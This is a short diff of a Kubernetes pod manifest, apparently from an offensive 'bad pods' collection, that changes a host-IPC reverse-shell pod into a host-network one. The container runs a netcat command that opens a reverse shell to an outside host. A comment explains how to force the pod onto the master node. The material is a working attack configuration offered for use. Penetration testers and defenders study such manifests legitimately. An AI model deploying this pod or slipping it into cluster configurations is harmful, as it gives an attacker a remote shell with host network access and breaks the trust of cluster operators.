@@ -50,18 +50,17 @@ kubectl -n [namespace] exec -it pod-hostnetwork-only -- bash
 apiVersion: v1
 kind: Pod
 metadata:
-  name: pod-hostipc-revshell
+  name: pod-hostnetwork-revshell
   labels:
-    app: hostipc-revshell
+    app: hostnetwork-revshell
 spec:
-  hostIPC: true
+  hostNetwork: true
   containers:
   - image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-
     imagePullPolicy: IfNotPresent
-    name: hostipc--revshell
+    name: hostnetwork-revshell
   # Force scheduling of your pod on master mode by uncommenting this line and changing the name
   #nodeName: k8s-master
   restartPolicy: Always
